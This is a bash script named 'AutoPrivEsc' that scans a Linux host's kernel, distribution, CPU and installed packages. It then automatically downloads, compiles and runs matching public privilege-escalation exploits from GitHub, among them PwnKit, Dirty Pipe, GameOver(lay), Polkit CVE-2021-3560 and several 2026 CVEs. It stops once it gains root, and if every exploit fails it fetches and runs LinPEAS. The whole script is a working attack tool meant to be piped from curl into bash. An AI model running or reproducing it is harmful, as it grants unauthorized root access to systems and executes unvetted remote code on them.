#!/bin/bash
# ============================================
# AutoPrivEsc - Scan -> Match -> Exploit
# Kullanim: curl -fsSL <RAW_URL> | bash
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ===== TOOLS =====
NEED="curl gcc make git python3 unzip wget"
for T in $NEED; do
    command -v $T >/dev/null 2>&1 || { echo -e "${RED}[-] missing: $T${NC}"; exit 1; }
done

# ===== BANNER =====
echo -e "${RED}"
echo "  ___        __  ___      _       _ ___  ___  ___ "
echo " / _ \      / / | _ \_ _ (_)_ __| | __|/ __|/ __|"
echo "| (_) |  _ / _ \|  _/ '_|| | '__| | _| \__ \ (__ "
echo " \___/  (_)_/ \_\_| |_|  |_|_|  |_|___||___/\___|"
echo -e "${NC}"
echo -e "${YELLOW}[*] Scanning system...${NC}"
echo ""

# ===== SYSTEM SCAN =====
KERNEL=$(uname -r)
OS=$(cat /etc/os-release 2>/dev/null | grep "^ID=" | cut -d= -f2 | tr -d '"')
OS_VER=$(cat /etc/os-release 2>/dev/null | grep "VERSION_ID" | cut -d= -f2 | tr -d '"')
ARCH=$(uname -m)
CPU=$(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2)
HOSTNAME=$(hostname)
KERNEL_MAJ=$(echo $KERNEL | cut -d. -f1)
KERNEL_MIN=$(echo $KERNEL | cut -d. -f2)

echo -e "${CYAN}[SYSTEM]${NC}"
echo "  Kernel : $KERNEL"
echo "  OS     : $OS $OS_VER"
echo "  Arch   : $ARCH"
echo "  CPU    :$CPU"
echo "  Host   : $HOSTNAME"
echo ""

# ===== ROOT CHECK =====
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] Already root. Nothing to do.${NC}"
    exit 0
fi

# ===== HELPERS =====
got_root() {
    echo -e "${RED}"
    echo "  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"
    echo "  ROOT GOT!"
    echo "  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"
    echo -e "${NC}"
    id
    echo ""
    echo -e "${GREEN}[+] Stopping. Clean up: rm -rf /tmp/apex${NC}"
    exit 0
}

run() {
    echo -e "${CYAN}[>] $1${NC}"
    bash -c "$1" 2>/dev/null
    if [ "$(id -u)" = "0" ]; then
        got_root "$1"
    fi
}

TMP=/tmp/apex
mkdir -p $TMP
cd $TMP

# ===== TARGETS =====
echo -e "${CYAN}[CHECKING EXPLOIT TARGETS]${NC}"
echo ""

# --- PwnKit (CVE-2021-4034) ---
if [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ]; then
    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (PwnKit)"
    run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn"
fi

# --- Dirty Pipe (CVE-2022-0847) ---
if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 8 ] && [ "$KERNEL_MIN" -le 16 ]; then
    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-0847 (Dirty Pipe)"
    run "git clone -q https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dp && cd dp && gcc exploit.c -o exploit && ./exploit"
fi

# --- DirtyFrag ---
if [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -ge 1 ] && [ "$KERNEL_MIN" -le 6 ]; then
    echo -e "${GREEN}[+] Kernel 6.$KERNEL_MIN ${NC}-> DirtyFrag"
    run "git clone -q https://github.com/V4bel/dirtyfrag.git df && cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp"
fi

# --- FragNesia ---
if ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 19 ] ) || ( [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -le 8 ] ); then
    echo -e "${GREEN}[+] Kernel 5.19-6.8 ${NC}-> FragNesia"
    run "git clone -q https://github.com/v12-security/pocs.git pocs && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp"
fi

# --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
    echo -e "${GREEN}[+] Ubuntu + OverlayFS${NC} -> CVE-2023-2640 + CVE-2023-32629"
    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && ./gameover.sh"
fi

# --- PackageKit (CVE-2026-41651) ---
if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
    echo -e "${GREEN}[+] PackageKit installed${NC} -> CVE-2026-41651"
    run "git clone -q https://github.com/Vozec/CVE-2026-41651.git pk && cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651"
fi

# --- Polkit / DBus (CVE-2021-3560) ---
if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
    echo -e "${GREEN}[+] Polkit present${NC} -> CVE-2021-3560"
    run "git clone -q https://github.com/cybersecurityworks/CVE-2021-3560-Exploit-POC.git p3560 && cd p3560 && python3 cve-2021-3560.py"
fi

# --- SSH keysign ---
if [ -f "/usr/lib/ssh/ssh-keysign" ]; then
    SSH_KEY=$(stat -c "%a" /usr/lib/ssh/ssh-keysign 2>/dev/null)
    if [ -n "$SSH_KEY" ] && [ "$SSH_KEY" -ge 4000 ] 2>/dev/null; then
        echo -e "${GREEN}[+] ssh-keysign SUID${NC} -> ssh-keysign-pwn"
        run "git clone -q https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn.git sk && cd sk && python3 main.py"
    fi
fi

# --- OVSwrap ---
if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
    echo -e "${GREEN}[+] Open vSwitch loaded${NC} -> OVSwrap"
    run "git clone -q https://github.com/manizada/OVSwrap.git ovs && cd ovs && python3 ovswrap-poc.py"
fi

# --- TONTOU ---
if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
    echo -e "${YELLOW}[~] AMD Zen 2${NC} -> TONTOU"
    run "wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou"
fi

# --- CVE-2026-46215 ---
if [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null; then
    echo -e "${YELLOW}[~] Kernel $KERNEL.x${NC} -> CVE-2026-46215"
    run "git clone -q https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git c46215 && cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit"
fi

# --- CVE-2026-31431 ---
echo -e "${YELLOW}[~] Trying CVE-2026-31431${NC}"
run "wget -q https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -O c31431.zip && unzip -oq c31431.zip && cd CVE-2026-31431-main && python3 main.py"

# --- CVE-2026-46300 ---
echo -e "${YELLOW}[~] Trying CVE-2026-46300${NC}"
run "git clone -q https://github.com/ExploitEoom/CVE-2026-46300.git c46300 && cd c46300 && chmod +x exploit && ./exploit"

# --- CVE-2026-64600 ---
echo -e "${YELLOW}[~] Trying CVE-2026-64600${NC}"
run "git clone -q https://github.com/Debajyoti0-0/CVE-2026-64600.git c64600 && cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600"

# ===== RESULT =====
echo "================================================"
echo -e "${RED}[-] No exploit succeeded. Running LinPEAS...${NC}"
echo ""
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
